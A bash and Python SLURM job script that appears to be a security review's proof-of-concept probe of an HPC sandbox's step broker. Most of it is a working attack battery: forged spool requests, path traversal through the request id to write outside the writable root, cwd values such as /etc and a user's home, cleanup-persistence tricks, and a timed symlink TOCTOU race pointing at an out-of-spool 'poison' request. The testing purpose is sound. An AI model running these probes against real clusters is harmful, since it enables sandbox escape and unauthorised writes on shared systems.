#!/bin/bash
#SBATCH --nodes=1
#SBATCH --ntasks=1
#SBATCH --time=00:05:00
#SBATCH --job-name=husk-review-A4
# A4 step-spool probe. Runs INSIDE the compute cage. Reads srun-stub.py to learn the
# step wire format, then exercises the running step-broker by dropping crafted req files
# into HUSK_STEP_SPOOL and observing where it writes resp/out/err. Stops at PoC.
set +e
WR="${HUSK_WRITABLE:-$PWD}"
JID="${SLURM_JOB_ID:-nojob}"
REPORT="$WR/husk-review-A4-report-$JID.txt"
SAVE="$WR/husk-review-A4-artifacts-$JID"
mkdir -p "$SAVE" 2>/dev/null
{
echo "################ A4 STEP-SPOOL PROBE ################"
echo "start_utc=$(date -u +%Y%m%dT%H%M%SZ)"
echo "host=$(hostname)"; echo "id=$(id)"; echo "pwd=$(pwd)"; echo "job=$JID"
echo
echo "===== [R1] husk env ====="
env | grep -E 'HUSK|SLURM_JOB|SPOOL|SOCK|SOCAT|WRITABLE|MUNGE' | sort
echo
echo "===== [R2] srun resolves to (should be the in-cage stub) ====="
SRUN="$(command -v srun 2>/dev/null)"
echo "srun=$SRUN"; ls -la "$SRUN" 2>&1
echo "--- head of srun target ---"; head -3 "$SRUN" 2>&1
cp "$SRUN" "$SAVE/srun-stub.py" 2>/dev/null && echo "(saved srun target to artifacts)"
echo
echo "===== [R3] step spool state ====="
SP="${HUSK_STEP_SPOOL:-}"
echo "HUSK_STEP_SPOOL=$SP"
if [ -z "$SP" ]; then echo "!! step pair INACTIVE (HUSK_STEP_SPOOL unset) — see job stderr"; fi
ls -la "$SP" 2>&1
echo "--- step spool owner file (if any) ---"; cat "$SP/owner" 2>&1
echo
echo "===== [R4] writable-root control: cage must NOT be able to write outside HUSK_WRITABLE ====="
PARENT="$(dirname "$WR")"
echo "HUSK_WRITABLE=$WR"; echo "parent(outside writable)=$PARENT"
CTRL="$PARENT/husk-review-A4-cage-control-$JID"
if touch "$CTRL" 2>/tmp/ctrlerr; then
  echo "UNEXPECTED: cage wrote $CTRL (parent is writable to the cage!)"; rm -f "$CTRL" 2>/dev/null
else
  echo "OK: cage cannot write parent ($CTRL): $(cat /tmp/ctrlerr 2>/dev/null)"
  echo "=> any husk-review-A4-* file that appears under $PARENT was written by the UNCAGED broker."
fi
echo
echo "===== [R5] relevant mounts (step spool / socat / net.sock / writable) ====="
grep -E 'husk-step-spool|husk-socat|net.sock|husk-'"$(id -u)" /proc/self/mountinfo 2>&1 | sed 's/ - .*//'
echo
echo "===== [R6] srun-stub wire format (grep the saved stub) ====="
grep -nE 'req-|resp-|HUSK_STEP_SPOOL|"id"|req_id|uuid|json.dump|os.path.join|"cwd"|"argv"|"env"|out-|err-|basename|normpath' "$SAVE/srun-stub.py" 2>&1 | head -60

# ---- run the crafted-request attack battery in python (exact JSON) ----
echo
echo "===== [A*] crafted-request attack battery ====="
python3 - "$SP" "$WR" "$SAVE" "$JID" <<'PYEOF'
import json, os, sys, time, glob, uuid, stat
spool, wr, save, jid = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
parent = os.path.dirname(wr)
def out(*a): print(*a, flush=True)
if not spool or not os.path.isdir(spool):
    out("step spool absent/unset — cannot run request battery (spool=%r)" % spool); sys.exit(0)

def scan(tag):
    hits=[]
    for base in (spool, wr, parent):
        try:
            for f in os.listdir(base):
                if 'husk-review-A4' in f and tag in f:
                    p=os.path.join(base,f); st=os.lstat(p)
                    inside = os.path.abspath(p).startswith(os.path.abspath(wr)+os.sep) or os.path.abspath(p)==os.path.abspath(wr)
                    hits.append((p, 'OUTSIDE-WRITABLE' if not inside else 'inside', oct(st.st_mode), st.st_uid))
        except Exception as e: pass
    return hits

def drop(fname, obj):
    p=os.path.join(spool, fname); tmp=p+'.tmp'
    with open(tmp,'w') as f: f.write(json.dumps(obj)); f.flush(); os.fsync(f.fileno())
    os.replace(tmp,p); return p

def wait_any_resp(timeout=8.0):
    # return list of resp-* files anywhere in spool/wr/parent that appear during the wait
    deadline=time.time()+timeout; seen=set()
    while time.time()<deadline:
        for base in (spool,wr,parent):
            try:
                for f in os.listdir(base):
                    if f.startswith('resp-') or 'husk-review-A4' in f:
                        seen.add(os.path.join(base,f))
            except Exception: pass
        time.sleep(0.2)
    return sorted(seen)

# Baseline/format probe: a minimal request mirroring the SLURM-broker schema, argv=/bin/true.
def base_req(rid):
    return {"version":1,"id":rid,"tool":"srun","submitted_at":"1970-01-01T00:00:00Z",
            "cwd":wr,"argv":["/bin/true"],"script":{"source":"none","name":None,"body":""},
            "job_args":[],"env":{}}

out("--- [A1] request injection: drop a well-formed req the stub never sent ---")
rid="husk-review-A4-inject-%s"%jid
fn="req-%s.json"%uuid.uuid4()
p=drop(fn, base_req(rid))
out("dropped %s (json id=%s)"%(fn,rid))
resps=wait_any_resp(8)
out("resp/marker files observed after inject: %s"%(resps or "NONE"))
for rp in resps:
    try: out("   %s => %s"%(rp, open(rp).read()[:400]))
    except Exception as e: out("   %s (unreadable: %s)"%(rp,e))

out("")
out("--- [A2] F1 id-as-path traversal (json id differs from filename) ---")
# filename benign; json id carries traversal. Watch where resp/out/err land.
cases={
 "up1":"../husk-review-A4-up1-%s"%jid,          # -> workdir (cage-writable; proves id->path)
 "up2":"../../husk-review-A4-up2-%s"%jid,        # -> husk-review/ (OUTSIDE writable = ESCAPE)
 "abs":os.path.join(parent,"husk-review-A4-abs-%s"%jid),  # absolute outside writable
 "slip":"x/../../husk-review-A4-slip-%s"%jid,    # embedded traversal
}
for tag,rid in cases.items():
    fn="req-%s.json"%uuid.uuid4()
    try:
        drop(fn, base_req(rid))
        out("[A2:%s] dropped %s with json id=%r"%(tag,fn,rid))
    except Exception as e:
        out("[A2:%s] drop failed: %s"%(tag,e))
time.sleep(8)
for tag in cases:
    h=scan(tag)
    out("[A2:%s] artifacts found: %s"%(tag, h or "NONE"))

out("")
out("--- [A3] cwd validation (is_workdir_allowed) ---")
for tag,cwd in {"root":"/","etc":"/etc","users":"/users/cmueller","up":os.path.join(wr,"..",".."),
                "tmp":"/tmp","masked_home":os.path.expanduser("~"),"good":wr}.items():
    rid="husk-review-A4-cwd-%s-%s"%(tag,jid)
    fn="req-%s.json"%uuid.uuid4()
    r=base_req(rid); r["cwd"]=cwd
    try: drop(fn,r); out("[A3:%s] dropped cwd=%r id=%s"%(tag,cwd,rid))
    except Exception as e: out("[A3:%s] drop failed: %s"%(tag,e))
time.sleep(6)
# collect any resp for cwd cases
for base in (spool,):
    for f in sorted(os.listdir(base)):
        if f.startswith('resp-') and 'cwd' in f:
            try: out("[A3] %s => %s"%(f, open(os.path.join(base,f)).read()[:300]))
            except Exception as e: out("[A3] %s unreadable %s"%(f,e))

out("")
out("--- [A4] argv/env passthrough marker ---")
rid="husk-review-A4-argenv-%s"%jid
fn="req-%s.json"%uuid.uuid4()
r=base_req(rid); r["argv"]=["/bin/true","--husk-review-A4-argv-canary"]; r["env"]={"HUSK_REVIEW_A4":"canary"}
try: drop(fn,r); out("[A4] dropped argv/env canary id=%s (confirmation needs broker log)"%rid)
except Exception as e: out("[A4] drop failed: %s"%e)
time.sleep(4)

out("")
out("--- [A6] cleanup persistence: leave a non-req file + subdir in the spool ---")
keep=os.path.join(spool,"husk-review-A4-KEEP-%s"%jid)
keepd=os.path.join(spool,"husk-review-A4-KEEPDIR-%s"%jid)
try:
    open(keep,"w").write("")   # empty marker, non-matching name -> survives targeted rm
    os.makedirs(keepd,exist_ok=True)
    out("[A6] created %s and %s ; spool should FAIL rmdir at job end and persist"%(keep,keepd))
except Exception as e:
    out("[A6] failed: %s"%e)

out("")
out("--- [A7] egress socket dir / socat (observation; subversion is A9) ---")
nd="/tmp/husk-%d-%s"%(os.getuid(),jid)
out("[A7] net dir %s :"%nd)
try:
    st=os.stat(nd); out("   mode=%s uid=%d (mine=%d)"%(oct(st.st_mode),st.st_uid,os.getuid()))
    out("   listing: %s"%os.listdir(nd))
except Exception as e: out("   stat failed (expected: /tmp is fresh tmpfs in cage): %s"%e)
for pth in ("/tmp/husk-socat", os.environ.get("HUSK_NET_SOCK","")):
    if pth:
        try: st=os.lstat(pth); out("   %s mode=%s uid=%d"%(pth,oct(st.st_mode),st.st_uid))
        except Exception as e: out("   %s: %s"%(pth,e))
# can the cage write into the net dir?
try:
    tp=os.path.join(nd,"husk-review-A4-sockprobe-%s"%jid); open(tp,"w").close(); os.remove(tp)
    out("[A7] UNEXPECTED: cage could write into %s"%nd)
except Exception as e:
    out("[A7] cage cannot write net dir (expected): %s"%e)
PYEOF

echo
echo "===== [A5] symlink TOCTOU race (bash, timed) ====="
# Place an out-of-spool 'poison' request; if the broker ever follows a symlink swap and
# processes it, its unique marker id will appear. Record attempts + wall time.
if [ -n "$SP" ] && [ -d "$SP" ]; then
  POISON="$WR/husk-review-A4-poison-$JID.json"
  cat > "$POISON" <<PJSON
{"version":1,"id":"husk-review-A4-RACEWIN-$JID","tool":"srun","submitted_at":"t","cwd":"$WR","argv":["/bin/true"],"script":{"source":"none","name":null,"body":""},"job_args":[],"env":{}}
PJSON
  GOOD='{"version":1,"id":"husk-review-A4-racegood","tool":"srun","submitted_at":"t","cwd":"'"$WR"'","argv":["/bin/true"],"script":{"source":"none","name":null,"body":""},"job_args":[],"env":{}}'
  N=300; t0=$(date +%s.%N)
  for i in $(seq 1 $N); do
    RF="$SP/req-race-$i.json"
    printf '%s' "$GOOD" > "$RF" 2>/dev/null
    ln -sf "$POISON" "$RF" 2>/dev/null   # swap real file -> symlink to out-of-spool poison
  done
  t1=$(date +%s.%N)
  sleep 3
  echo "[A5] $N swap iterations in $(echo "$t1 - $t0"|bc 2>/dev/null || echo '?')s"
  echo "[A5] RACEWIN marker present? (would prove broker followed a symlink out of spool):"
  ls -la "$WR"/*RACEWIN* "$SP"/*RACEWIN* 2>&1 | grep -v 'No such' || echo "   none — race not won this run"
  echo "[A5] leftover race req files in spool:"; ls "$SP"/req-race-* 2>/dev/null | wc -l
else
  echo "[A5] skipped (no step spool)"
fi

echo
echo "===== [Z] final spool state ====="
ls -la "$SP" 2>&1
echo "end_utc=$(date -u +%Y%m%dT%H%M%SZ)"
echo "################ A4 PROBE END ################"
} > "$REPORT" 2>&1
# surface the report into the job's stdout too (slurm-<jobid>.out)
cat "$REPORT"
